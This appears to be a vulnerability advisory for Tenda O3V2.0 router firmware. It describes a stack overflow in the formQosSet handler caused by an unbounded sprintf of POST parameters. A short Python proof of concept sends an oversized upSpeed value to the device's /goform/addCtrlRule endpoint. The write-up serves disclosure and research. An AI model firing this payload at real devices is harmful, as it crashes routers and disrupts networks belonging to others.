## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2832.html

## Affected version

O3V2.0 V1.0.0.10(2478)

## Vulnerability details

In the O3V2.0 V1.0.0.10(2478) firmware has a stack overflow vulnerability in the `formQosSet` function. The `v9, v10, v11, v12, v13` variable receives the `remark, ipRange, upSpeed, downSpeed, enable` parameters from a POST request. However, since the user can control the input of these parameters, the statement `sprintf(v36, "%d;%s;%s;%s;%s;%s;0;0;0;1", v2 + 1, v13, v9, v10, v11, v12);` can cause a buffer overflow. The user-provided  `remark, ipRange, upSpeed, downSpeed, enable` can exceed the capacity of the `v36` array, triggering this security vulnerability.

![image-20240714215037298](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240714215037298.png)

![image-20240714215059428](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240714215059428.png)

## POC

```python
import requests

ip = "192.168.84.101"
url = "http://" + ip + "/goform/addCtrlRule"
payload = b"a"*2000

data = {"upSpeed": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240714213455164](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240714213455164.png)
